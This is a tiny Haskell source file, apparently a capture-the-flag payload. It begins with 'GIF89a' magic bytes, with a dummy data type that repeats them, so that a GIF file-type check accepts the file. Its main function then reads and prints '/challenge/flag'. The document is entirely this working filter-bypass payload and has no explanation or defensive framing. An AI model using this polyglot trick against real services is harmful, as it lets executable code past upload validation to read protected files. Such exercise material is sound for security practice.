 = GIF89a
data GIF89a a = GIF89a

main = do
     contents <- readFile "/challenge/flag"
     putStr contents

